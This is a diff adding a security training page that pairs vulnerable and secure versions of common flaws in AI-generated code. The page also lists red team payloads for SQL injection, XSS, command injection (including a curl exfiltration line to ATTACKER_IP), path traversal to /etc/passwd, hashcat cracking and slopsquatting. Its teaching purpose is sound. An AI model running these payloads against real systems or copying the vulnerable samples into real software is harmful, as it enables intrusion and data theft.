@@ -1,0 +1,318 @@
+---
+layout: training-page
+title: "AI-Generated Code Security Anti-Patterns — Red Team Academy"
+module: "AI Red Team Agents"
+tags:
+  - ai-security
+  - secure-coding
+  - llm
+  - code-review
+  - vulnerabilities
+page_key: "ai-code-security"
+---
+<h1>AI-Generated Code Security Anti-Patterns</h1>
+<p>AI coding assistants are now used by 97% of developers, with 40%+ of codebases estimated to be AI-generated. Research shows AI-generated code is <strong>2.74x more likely</strong> to contain XSS vulnerabilities than human-written code, with an 86% XSS failure rate in studies. 81% of organizations have shipped vulnerable AI-generated code to production. This page covers the most critical anti-patterns AI models reproduce — both for red teamers who want to spot them in targets, and defenders who want to prevent them in their own AI-assisted development.</p>
+
+  <h2>Why AI Generates Vulnerable Code</h2>
+  <pre><code># Root causes:
+# 1. Training data contamination — SQL injection patterns appeared "thousands of times"
+#    in training corpora (Stack Overflow, GitHub tutorials, legacy code)
+# 2. Pattern completion over security — models optimize for code that looks correct
+#    and runs, not code that is secure
+# 3. Context blindness — models don't know the threat model, trust boundaries,
+#    or what data is attacker-controlled
+# 4. Hallucinated packages — 5-21% of AI-suggested packages don't exist
+#    (slopsquatting/dependency confusion attack surface)
+# 5. Tutorial examples — "quick start" code with hardcoded credentials gets
+#    reproduced in production contexts
+
+# Key statistics (sec-context research, 2026):
+# - 86% XSS failure rate in AI-generated code (vs 31.6% human)
+# - 72% of Java AI code contains vulnerabilities
+# - 21.7% hallucination rate for package names in some domains
+# - AI code 2.74x more likely to have XSS vulnerabilities
+# - 81% of orgs have shipped vulnerable AI code to production</code></pre>
+
+  <h2>Critical Anti-Pattern 1: Hardcoded Secrets</h2>
+  <pre><code># CWE-798 / CWE-259 — Severity: CRITICAL
+# AI frequently embeds credentials from tutorial examples into production code
+
+# VULNERABLE (what AI generates):
+API_KEY = "sk-abcd1234efgh5678ijkl9012mnop3456"
+DB_PASSWORD = "super_secret_password"
+AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
+
+def call_api(endpoint):
+    headers = {"Authorization": f"Bearer {API_KEY}"}
+    return requests.get(endpoint, headers=headers)
+
+# SECURE (enforce this pattern):
+import os
+def call_api(endpoint):
+    api_key = os.environ.get("API_KEY")
+    if not api_key:
+        raise ValueError("API_KEY environment variable required")
+    headers = {"Authorization": f"Bearer {api_key}"}
+    return requests.get(endpoint, headers=headers)
+
+# Red team detection:
+# - grep -r "sk-" . / grep -r "AKIA" . / truffleHog / gitleaks
+# - Search GitHub/GitLab for org name + "password" / "secret" / "api_key"
+# - GitHub Advanced Security secret scanning alerts (often public in org settings)
+# - Exposed .env files: google: site:target.com ".env" filetype:env</code></pre>
+
+  <h2>Critical Anti-Pattern 2: SQL Injection</h2>
+  <pre><code># CWE-89 — Severity: CRITICAL
+# AI reproduces string concatenation SQL from countless tutorial examples
+
+# VULNERABLE:
+def get_user(username):
+    query = "SELECT * FROM users WHERE username = '" + username + "'"
+    return db.execute(query)
+
+# VULNERABLE (f-string variant — AI loves this):
+def get_user(username):
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    return db.execute(query)
+
+# SECURE — parameterized queries:
+def get_user(username):
+    query = "SELECT * FROM users WHERE username = ?"   # SQLite
+    # Or: "SELECT * FROM users WHERE username = %s"    # MySQL/PostgreSQL
+    return db.execute(query, (username,))
+
+# SECURE — ORM (preferred):
+user = User.query.filter_by(username=username).first()  # SQLAlchemy
+
+# Red team exploitation:
+# - ' OR '1'='1
+# - ' OR 1=1--
+# - ' UNION SELECT null,username,password FROM users--
+# - Blind: ' AND SLEEP(5)--   (MySQL) / ' AND pg_sleep(5)--  (PostgreSQL)
+# - sqlmap -u "http://target.com/user?id=1" --dbs --batch</code></pre>
+
+  <h2>Critical Anti-Pattern 3: XSS (Cross-Site Scripting)</h2>
+  <pre><code># CWE-79 — Severity: CRITICAL
+# 86% XSS failure rate in AI code — the most common AI vulnerability
+
+# VULNERABLE — reflected XSS:
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    return f"&lt;h1&gt;Results for: {query}&lt;/h1&gt;"   # user input in HTML unescaped
+
+# VULNERABLE — stored XSS (AI writes this for comments/posts):
+def display_comment(comment_text):
+    return f"&lt;div class='comment'&gt;{comment_text}&lt;/div&gt;"
+
+# SECURE — escape output:
+from markupsafe import escape
+def display_comment(comment_text):
+    return f"&lt;div class='comment'&gt;{escape(comment_text)}&lt;/div&gt;"
+
+# SECURE — use template engine (auto-escapes by default):
+# Jinja2: {{ comment_text }}  ← auto-escaped
+# Django templates: {{ comment_text }}  ← auto-escaped
+# React JSX: {commentText}  ← auto-escaped (use dangerouslySetInnerHTML only when required)
+
+# DOM XSS — AI generates this in JavaScript:
+# VULNERABLE:
+document.getElementById('output').innerHTML = userInput;
+// SECURE:
+document.getElementById('output').textContent = userInput;  // plain text only
+
+# Red team payloads:
+# &lt;script&gt;alert(1)&lt;/script&gt;
+# &lt;img src=x onerror=alert(1)&gt;
+# &lt;svg onload=alert(1)&gt;
+# javascript:alert(1)  (in href attributes)
+# '&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+  <h2>Critical Anti-Pattern 4: Command Injection</h2>
+  <pre><code># CWE-78 — Severity: CRITICAL
+# AI uses shell=True without thinking when subprocess is needed
+
+# VULNERABLE:
+import subprocess
+def ping_host(host):
+    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)
+    return result.stdout.decode()
+
+# ATTACK: host = "google.com; cat /etc/passwd"
+
+# SECURE — argument arrays, never shell=True with user input:
+import subprocess, shlex
+def ping_host(host):
+    # Validate input first:
+    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
+        raise ValueError("Invalid hostname")
+    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, timeout=5)
+    return result.stdout.decode()
+
+# Red team payloads:
+# ; ls -la
+# | cat /etc/passwd
+# && id
+# `id`
+# $(id)
+# ; curl ATTACKER_IP/$(whoami)   (out-of-band data exfil)</code></pre>
+
+  <h2>Critical Anti-Pattern 5: Missing Authentication on API Endpoints</h2>
+  <pre><code># CWE-287 — Severity: CRITICAL
+# AI generates API endpoints focused on functionality, forgets auth on admin/internal routes
+
+# VULNERABLE (AI writes this for "internal" endpoints):
+@app.route('/api/admin/users')
+def get_all_users():
+    users = User.query.all()
+    return jsonify([u.to_dict() for u in users])
+
+@app.route('/api/export/data')
+def export_data():
+    return send_file('backup.csv')
+
+# SECURE — apply auth decorator to every protected route:
+from functools import wraps
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get('Authorization', '').replace('Bearer ', '')
+        if not validate_token(token):
+            return jsonify({'error': 'Unauthorized'}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+@app.route('/api/admin/users')
+@require_auth
+def get_all_users():
+    ...
+
+# Red team detection:
+# - Run ffuf/feroxbuster against /api/ paths without auth headers
+# - Check for /swagger.json or /api-docs — often exposes all endpoints
+# - Test: curl -s https://target.com/api/admin/users
+# - Postman collections leaked in JS bundles often reveal unauthenticated endpoints</code></pre>
+
+  <h2>Critical Anti-Pattern 6: Path Traversal</h2>
+  <pre><code># CWE-22 — Severity: HIGH
+# AI writes file-serving code without validating that the path stays within the allowed directory
+
+# VULNERABLE:
+@app.route('/download')
+def download():
+    filename = request.args.get('file')
+    return send_file(f"/var/www/files/{filename}")
+    # Attack: ?file=../../etc/passwd  or  ?file=../../../proc/self/environ
+
+# SECURE — use os.path.realpath to resolve and validate:
+import os
+UPLOAD_DIR = '/var/www/files'
+
+@app.route('/download')
+def download():
+    filename = request.args.get('file', '')
+    # Resolve to absolute path and check it's within UPLOAD_DIR:
+    full_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
+    if not full_path.startswith(UPLOAD_DIR + os.sep):
+        return 'Forbidden', 403
+    return send_file(full_path)
+
+# Red team payloads:
+# ?file=../../etc/passwd
+# ?file=..%2F..%2Fetc%2Fpasswd  (URL encoded)
+# ?file=....//....//etc/passwd  (double-dot obfuscation)
+# ?file=/etc/passwd             (absolute path)
+# ?file=../../../proc/self/environ  (env vars including secrets)</code></pre>
+
+  <h2>Critical Anti-Pattern 7: Weak Cryptography</h2>
+  <pre><code># CWE-326/327 — Severity: HIGH
+# AI defaults to MD5/SHA1 for passwords, uses ECB mode, or rolls its own crypto
+
+# VULNERABLE:
+import hashlib
+def hash_password(password):
+    return hashlib.md5(password.encode()).hexdigest()  # no salt, fast hash = easily cracked
+
+# VULNERABLE (ECB mode — patterns visible):
+from Crypto.Cipher import AES
+cipher = AES.new(key, AES.MODE_ECB)
+
+# VULNERABLE (hardcoded IV):
+cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00' * 16)
+
+# SECURE — bcrypt for passwords:
+import bcrypt
+def hash_password(password: str) -> bytes:
+    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+
+def verify_password(password: str, hashed: bytes) -> bool:
+    return bcrypt.checkpw(password.encode(), hashed)
+
+# SECURE — AES-GCM for encryption (authenticated):
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import os
+def encrypt(plaintext: bytes, key: bytes) -> tuple[bytes, bytes]:
+    nonce = os.urandom(12)   # random 96-bit nonce — never reuse
+    aesgcm = AESGCM(key)
+    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
+    return nonce, ciphertext
+
+# Red team: if password hashes are leaked, crack with:
+# hashcat -m 0 hash.txt rockyou.txt       (MD5)
+# hashcat -m 100 hash.txt rockyou.txt     (SHA1)
+# hashcat -m 3200 hash.txt rockyou.txt    (bcrypt — much slower)</code></pre>
+
+  <h2>AI Package Hallucination — Supply Chain Risk</h2>
+  <pre><code"># 5-21% of AI-suggested packages don't exist — "slopsquatting"
+# Attacker registers the hallucinated package name with malicious code
+
+# Example: AI suggests:
+# pip install python-jwt-utils   (doesn't exist — attacker registers it)
+# npm install react-auth-helper  (AI hallucination — malicious package uploaded)
+
+# Red team targeting hallucinated packages:
+# 1. Identify AI-assisted codebases (common in startups, new projects)
+# 2. Find obscure imports in requirements.txt / package.json
+# 3. Check if package exists on PyPI/npm before attacker does
+# 4. Register the package with a malicious postinstall script
+
+# Defense:
+# - Pin exact package versions with hash verification
+# - Use dependency review tools (pip-audit, npm audit)
+# - Verify packages exist and have download history before adding
+# - Lock files (requirements.txt with ==, package-lock.json)</code></pre>
+
+  <h2>Red Team Checklist — Finding AI Code Vulnerabilities</h2>
+  <pre><code"># When targeting an organization using AI-assisted development:
+
+# 1. Secret scanning:
+gitleaks detect --source . --verbose
+trufflehog filesystem .
+# Or: git log --all --oneline | head -100  (check commit history for removed secrets)
+
+# 2. Find injectable parameters in API endpoints:
+# Look for string concatenation in query building
+grep -r "f\"SELECT\|'SELECT.*+\|query.*+.*request" --include="*.py" .
+grep -r "innerHTML\|dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx" .
+
+# 3. Find unauthenticated routes:
+# Routes without @login_required, @require_auth, middleware, etc.
+grep -rn "@app.route\|router\." --include="*.py" . | grep -v "login\|auth\|jwt"
+
+# 4. Check cryptography:
+grep -rn "md5\|sha1\|MODE_ECB\|hashlib" --include="*.py" .
+
+# 5. Check for hardcoded values:
+grep -rn "password\s*=\s*['\"]" --include="*.py" --include="*.js" .
+grep -rn "secret\s*=\s*['\"]" --include="*.py" --include="*.js" .</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>sec-context AI anti-patterns — <code>github.com/arcanum-sec/sec-context</code></li>
+    <li>OWASP Top 10 — <code>owasp.org/www-project-top-ten/</code></li>
+    <li>CWE Top 25 Most Dangerous Software Weaknesses — <code>cwe.mitre.org/top25/</code></li>
+    <li>Semgrep rules for AI-generated code — <code>semgrep.dev/r</code></li>
+    <li>GitLeaks — secret scanning — <code>github.com/gitleaks/gitleaks</code></li>
+    <li>TruffleHog — credential scanning — <code>github.com/trufflesecurity/trufflehog</code></li>
+    <li>MITRE ATT&amp;CK T1195 — Supply Chain Compromise — <code>attack.mitre.org/techniques/T1195/</code></li>
+  </ul>
